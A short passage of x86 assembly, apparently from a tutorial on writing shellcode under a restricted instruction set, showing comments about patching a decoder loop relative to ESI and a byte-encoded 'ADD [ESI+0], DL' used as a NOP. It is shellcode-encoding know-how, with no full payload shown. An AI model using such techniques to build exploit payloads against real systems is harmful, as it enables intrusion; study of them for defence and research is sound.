...
shellcode:
    ...
    ; start patching. Assuming ESI points to the baseaddress of this code,
    ; the decoder loop will be around ESI+0x100. Since our limited instruction
    ; set does not include a direct way to add a value to a register, we have
    ; to do this in another way:
    PUSH    ESI                         ;                        > A4A3A2A1
                    db 0x00, 0x56, 0x00 ;NOP - ADD [ESI+0], DL
